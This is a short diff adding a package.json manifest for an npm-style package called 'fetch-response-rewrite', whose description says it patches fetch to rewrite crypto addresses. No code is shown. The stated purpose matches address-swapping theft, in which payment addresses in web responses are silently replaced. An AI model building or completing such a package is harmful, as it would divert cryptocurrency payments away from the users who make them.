@@ -1,0 +1,7 @@
+{
+  "name": "fetch-response-rewrite",
+  "version": "1.0.0",
+  "description": "Patches fetch to rewrite crypto addresses",
+  "main": "index.js",
+  "license": "MIT"
+}
